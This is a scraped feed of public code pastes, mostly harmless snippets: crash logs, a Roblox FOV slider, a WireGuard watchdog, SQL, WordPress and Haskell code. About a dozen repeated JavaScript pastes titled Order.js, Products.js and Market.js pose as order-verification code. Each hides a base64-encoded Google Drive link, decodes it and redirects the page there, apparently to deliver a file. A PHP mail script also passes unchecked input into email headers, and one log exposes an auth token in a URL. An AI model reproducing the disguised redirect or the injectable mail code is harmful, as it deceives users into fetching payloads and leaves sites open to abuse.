error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
qV9Jq3YG,2025-04-11T08:40:42.025202,powerampache,PHP,Thursday 10th of April 2025 10:40:45 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":85},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":310930213,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d363a26e599f5477fcb1c8b1f466e233f\u0026type\u003dsong\u0026id\u003d4570"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
XVTJ222g,Untitled,WassupDog45,JavaScript,Thursday 10th of April 2025 10:39:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44309/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ESreKpm2,Products.js,WassupDog45,JavaScript,Thursday 10th of April 2025 10:24:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52327/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iAhvkers,Order.js,WassupDog45,JavaScript,Thursday 10th of April 2025 10:09:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37520/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7GMgUHKL,Market.js,WassupDog45,JavaScript,Thursday 10th of April 2025 09:53:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56376/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Yxc0n7ds,FOV Changer in Roblox,Rinbow,Lua,Thursday 10th of April 2025 09:43:52 PM CDT,"local player = game.Players.LocalPlayer
local camera = workspace.CurrentCamera
local userInputService = game:GetService(""UserInputService"")

-- GUI Setup
local screenGui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
screenGui.Name = ""FOVSliderGui""
screenGui.ResetOnSpawn = false

-- Enable UI drag behavior
local function makeDraggable(frame)
	local dragging = false
	local dragInput, dragStart, startPos

	local function update(input)
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	userInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

-- Toggle Button
local toggleButton = Instance.new(""TextButton"", screenGui)
toggleButton.Position = UDim2.new(0.9, -60, 0.05, 0)
toggleButton.Size = UDim2.new(0, 60, 0, 30)
toggleButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
toggleButton.TextColor3 = Color3.new(1, 1, 1)
toggleButton.Text = ""FOV""
toggleButton.TextScaled = true
makeDraggable(toggleButton)

-- FOV Frame
local frame = Instance.new(""Frame"", screenGui)
frame.Position = UDim2.new(0.35, 0, 0.9, 0)
frame.Size = UDim2.new(0.3, 0, 0.08, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 2
frame.Visible = false
makeDraggable(frame)

-- Slider
local slider = Instance.new(""TextButton"", frame)
slider.Size = UDim2.new(0.05, 0, 1, 0)
slider.Position = UDim2.new((camera.FieldOfView - 1)/119, 0, 0, 0)
slider.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
slider.Text = """"

-- FOV Label
local fovLabel = Instance.new(""TextLabel"", frame)
fovLabel.Size = UDim2.new(1, 0, 0.5, 0)
fovLabel.Position = UDim2.new(0, 0, -1, 0)
fovLabel.BackgroundTransparency = 1
fovLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
fovLabel.TextScaled = true
fovLabel.Text = ""FOV: "" .. camera.FieldOfView

-- Toggle Visibility
toggleButton.MouseButton1Click:Connect(function()
	frame.Visible = not frame.Visible
end)

-- Slider Logic
local draggingSlider = false
local activeInput = nil

slider.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		draggingSlider = true
		activeInput = input
	end
end)

userInputService.InputEnded:Connect(function(input)
	if input == activeInput then
		draggingSlider = false
		activeInput = nil
	end
end)

userInputService.InputChanged:Connect(function(input)
	if draggingSlider and input == activeInput then
		local pos = input.Position.X
		local framePos = frame.AbsolutePosition.X
		local frameSize = frame.AbsoluteSize.X

		local relativeX = math.clamp(pos - framePos, 0, frameSize)
		local percent = relativeX / frameSize
		local newFOV = math.floor(1 + (percent * 119))

		slider.Position = UDim2.new(percent, -slider.Size.X.Offset / 2, 0, 0)
		camera.FieldOfView = newFOV
		fovLabel.Text = ""FOV: "" .. newFOV
	end
end)"
NX23DyAv,Untitled,WassupDog45,JavaScript,Thursday 10th of April 2025 09:38:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24225/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S64HF7kB,Products.js,WassupDog45,JavaScript,Thursday 10th of April 2025 09:23:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17172/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0Tx1fgnf,Untitled,gpz1100,Bash,Thursday 10th of April 2025 09:22:32 PM CDT,"#!/bin/sh

#set -x
#trap read debug

TIMEOUT=60
TIMEOUT_DHCP=120
INTERFACE=ens32
LOG=/root/netcheck.log
SCRIPT_PATH=/root
WIREGUARD_IP=""10.7.1.1""
INTERNET_IP1=""8.8.8.8""
INTERNET_IP2=""4.2.2.2""
CHECK_INTERVAL=5        #how often to perform checks in seconds
#NET_INT=`ip route | awk '/default/ { print $5 }'`    #default gateway interface
NET_INT=ens32
WG_INT=wg0

# exit if another instance of script is already running
        MY_SCRIPT_NAME=`basename ""$0""`
        if pidof -o %PPID  -x $MY_SCRIPT_NAME  > /dev/null; then
        echo ""`date +%Y-%m-%d"" ""%H:%M:%S` `hostname | cut -d'.' -f1` netcheck.sh: Watchdog script already running, PID:`pidof -o %PPID  -x $MY_SCRIPT_NAME`,  exiting."" >> $LOG 2>&1
        exit 1
        fi

check_ip () {
        if ping -c 1 -W 1 $1 > /dev/null 2>&1
        then return
        else
        return
        fi

}

# 1 check wireguard connectivity
# 2 if good, exit, if not, check internet connection
# 3 if internet connection good, check wireguard service

while true; do

        if ! check_ip $WIREGUARD_IP
                then
                if check_ip $INTERNET_IP1 || check_ip $INTERNET_IP2 # if internet up then check if wireguard is responsive
                then
                        if ! wg | grep handshake  #restart wg if not active
                        then
                                systemctl restart wg-quick@wg0
                                echo ""`date +%Y-%m-%d"" ""%H:%M:%S` `hostname | cut -d'.' -f1` netcheck.sh: Wireguard not connected, restarting"" >> $LOG 2>&1
                        fi
                else
                        systemctl stop wg-quick@wg0
                        dhclient -r -lf /var/lib/dhcp/dhclient.leases.$NET_INT -pf /var/run/dhclient.$NET_INT.pid $NET_INT
                        dhclient -v -lf /var/lib/dhcp/dhclient.leases.$NET_INT -pf /var/run/dhclient.$NET_INT.pid $NET_INT
                        echo $?
                        echo ""`date +%Y-%m-%d"" ""%H:%M:%S` `hostname | cut -d'.' -f1` netcheck.sh: DHCP renewed"" >> $LOG 2>&1
                        sleep 5
                        systemctl start wg-quick@$WG_INT
                        echo ""`date +%Y-%m-%d"" ""%H:%M:%S` `hostname | cut -d'.' -f1` netcheck.sh: Wireguard restarted"" >> $LOG 2>&1
                fi

        fi
sleep $CHECK_INTERVAL
done

"
tSc8ZpHZ,change default image block resolutions,arie_cristianD,PHP,Thursday 10th of April 2025 09:21:43 PM CDT,"add_filter(
	'block_editor_settings_all',
	function ( $settings ) {
		$settings['imageDefaultSize'] = 'large'; /*  default size saat insert image , you can change with 'medium', 'thumbnail', or 'full' */
		return $settings;
	}
);
"
cfWgYTWu,Order.js,WassupDog45,JavaScript,Thursday 10th of April 2025 09:07:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46684/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RPdC12eQ,Reporte Qr Quemados Subway,EmilianoRoldanR,SQL,Thursday 10th of April 2025 08:56:51 PM CDT,"SELECT ql.date, qd.textQR, p.description, p.expiration_date, e.name, ql.store, ql.cash_desk, '0' as precio, p.type, p.qrtype
FROM qr_data qd
LEFT JOIN promotions p ON qd.idpromocion = p.id
LEFT JOIN qr_log ql ON qd.textQR = ql.textQR
LEFT JOIN employees e ON qd.id_employee = e.id 
WHERE qd.textQR != '97BS4F7D' AND qd.status = 0 AND p.id in (1, 2, 3, 4, 5)

/* Consulta que sirve por ahora para el reporte de qr quemados de subway. */"
6i6MgrJT,Send Gmail Anon90,Anshuopo,PHP,Thursday 10th of April 2025 08:54:39 PM CDT,"<?php
$data = json_decode(file_get_contents(""php://input""), true);
$name = $data['name'];
$email = $data['email'];
$message = $data['message'];

$to = ""harikgond@gmail.com""; // ‚Üê yahan apna Gmail daalo
$subject = ""New Message from Website"";
$body = ""Name: $name\nEmail: $email\nMessage:\n$message"";
$headers = ""From: $email\r\nReply-To: $email"";

if(mail($to, $subject, $body, $headers)){
  echo ""success"";
} else {
  echo ""fail"";
}
?>"
cTwTq2U2,Ninety-Nine Haskell Problems: #10,banovski,Haskell,Thursday 10th of April 2025 08:28:11 PM CDT,"-- Implement the so-called run-length encoding data compression
-- method. Consecutive duplicates of elements are encoded as lists (N
-- E) where N is the number of duplicates of the element E:
-- ""aaaabccaadeeee"" ->
-- [(4,'a'),(1,'b'),(2,'c'),(2,'a'),(1,'d'),(4,'e')]

import Data.List

main :: IO ()
main = do
  putStrLn ""Validity test results: ""
  mapM_ (print . functionTester) testFunctions

testFunctions :: Eq a => [[a] -> [(Int, a)]]
testFunctions = [one
  , two
  , three
  , four
  , five]

testList :: [String]
testList = [""a"", ""aa"", ""ab"", ""aaa"", ""aab"", ""aba"", ""baa"", ""aaaa"",""aaab"",""aaba"",""aabb"", ""abbb""]

verificationList :: [[(Int, Char)]]
verificationList = [
    [(1,'a')]
  , [(2,'a')]
  , [(1,'a'),(1,'b')]
  , [(3,'a')]
  , [(2,'a'),(1,'b')]
  , [(1,'a'),(1,'b'),(1,'a')]
  , [(1,'b'),(2,'a')]
  , [(4,'a')]
  , [(3,'a'),(1,'b')]
  , [(2,'a'),(1,'b'),(1,'a')]
  , [(2,'a'),(2,'b')]
  , [(1,'a'),(3,'b')]]

functionTester :: (String -> [(Int, Char)]) -> Bool
functionTester function = verificationList == map function testList

-- Tested functions. Latency is measured in ticks. The size of the
-- test list for functionns one to four is 1000405 items, for the
-- fifth function, due to its ineffiency, its 10011 itmes.

-- 144
one :: Eq a => [a] -> [(Int, a)]
one = encode . group
  where
    encode = map (\x -> (length x, head x))

-- 163
two :: Eq a => [a] -> [(Int, a)]
two [] = []
two lst = foldr go [(1, last lst)] (init lst)
  where
    go i ((n, v):xs)
        | i == v = (n + 1, v) : xs
        | otherwise = (1, i) : (n, v) : xs

-- 155
three :: Eq a => [a] -> [(Int, a)]
three [] = []
three lst = reverse $ foldl go [(1, head lst)] (tail lst)
  where
    go ((n, v):xs) i
      | v == i = (n + 1, v) : xs
      | otherwise = (1, i) : (n, v) : xs

-- 79
four :: Eq a => [a] -> [(Int, a)]
four [] = []
four list = reverse $ go [(1, head list)] (tail list)
  where
    go acc [] = acc
    go ((n, v):xs) (y:ys)
      | v == y = go ((n + 1, v) : xs) ys
      | otherwise = go ((1, y) : (n, v) : xs) ys

-- 90 ticks; tested on a list with 10011 items.
five :: Eq a => [a] -> [(Int, a)]
five [] = []
five list = go [(1, head list)] (tail list)
  where
    go acc [] = acc
    go acc (y:ys)
      | (snd . last) acc == y =
        go (init acc ++ [(fst (last acc) + 1, snd (last acc))]) ys
      | otherwise = go (acc ++ [(1, y)]) ys

-- Validity check results:
-- True
-- True
-- True
-- True
-- True
"
7wcAqMCk,Market.js,WassupDog45,JavaScript,Thursday 10th of April 2025 07:52:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05123/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BtWse6Kb,2025-04-11T08:42:35.864730,powerampache,PHP,Thursday 10th of April 2025 07:42:37 PM CDT,"1.01-79 (79) - DB: 83
com.google.gson.stream.MalformedJsonException: Use JsonReader.setStrictness(Strictness.LENIENT) to accept malformed JSON at line 1 column 1 path $
See https://github.com/google/gson/blob/main/Troubleshooting.md#malformed-json
	at com.google.gson.stream.JsonReader.syntaxError(JsonReader.java:1754)
	at com.google.gson.stream.JsonReader.checkLenient(JsonReader.java:1550)
	at com.google.gson.stream.JsonReader.doPeek(JsonReader.java:676)
	at com.google.gson.stream.JsonReader.peek(JsonReader.java:507)
	at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory$Adapter.read(ReflectiveTypeAdapterFactory.java:500)
	at retrofit2.converter.gson.GsonResponseBodyConverter.convert(GsonResponseBodyConverter.java:40)
	at retrofit2.converter.gson.GsonResponseBodyConverter.convert(GsonResponseBodyConverter.java:27)
	at retrofit2.OkHttpCall.parseResponse(OkHttpCall.java:246)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:156)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

register() - cannot load data IOException {""detailMessage"":""Use JsonReader.setStrictness(Strictness.LENIENT) to accept malformed JSON at line 1 column 1 path $\nSee https://github.com/google/gson/blob/main/Troubleshooting.md#malformed-json"",""stackTrace"":[]}"
enrn0Tg0,Untitled,WassupDog45,JavaScript,Thursday 10th of April 2025 07:36:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02250/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3SeJGBrC,Products.js,WassupDog45,JavaScript,Thursday 10th of April 2025 07:21:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45063/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
